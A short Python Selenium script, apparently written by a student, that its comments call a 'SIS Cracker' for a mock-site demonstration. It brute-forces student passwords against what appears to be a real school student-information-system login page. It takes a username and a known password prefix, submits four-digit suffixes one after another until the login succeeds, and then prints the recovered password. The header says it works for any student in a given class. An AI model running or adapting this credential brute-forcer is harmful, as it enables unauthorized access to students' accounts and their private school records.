#Nolan Campbell 05072021
#Modified SIS Cracker created for demonstration on mock website for EEP project

#gets the libraries required for functions used in this program
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from timeit import default_timer as timer
from selenium import webdriver
import time

# Works for any RP student class, as long as four-letter base is known

#Collect user input, used as parameters during brute force
name = input("enter username here(first.last###): ")
base = input("Enter password base either bike, best, or rp 21:")
start = timer()

# SETUP

numToUse = str(6700).zfill(4) #Starting point, very targeted towards correct password

#may need to replace the executable path with the correct destination on your computer
browser = webdriver.Chrome(executable_path=r"chromedriver.exe")#sets the webdriver to open the browser

browser.get('https://sdm.sisk12.com/RP360x3/login') #opens tyler sis in google chrome

time.sleep(1.5) #this is a pause to ensure that the site loads fully
student = browser.find_element_by_id("mat-tab-label-0-2")#finds the student tab inside the browser
student.click()#clicks on the student tab

username = browser.find_element_by_id("txtUserName") #sets focus on the username text input box
username.send_keys(name)#inputs the username inputed earlier

password = browser.find_element_by_id("txtPassword") #sets focus on the password text input box

#Brute Force Iterations
while browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):#attempts different passwords until a login is found via change in url
    password.clear()#removes any text the password box
    password.send_keys(base + str(numToUse).zfill(4)) #inputs the current password attempt
    password.send_keys(Keys.RETURN)#presses enter to submit the info to tylersis

    print (str(numToUse).zfill(4))#prints the current password attempt for troubleshooting and to look like one of those cool movie hackers
    numToUse = int(numToUse) + 1 #goes to the next password
    time.sleep(1)#delay to allow tyler sis to process the login information submitted

print("The username is: " + name)#prints the username inputed earlier
print("The password is: " + base + (str(numToUse-1).zfill(4)))#prints the correct password for the user inputed
#Close browser is unsuccessful
if browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):
    browser.close()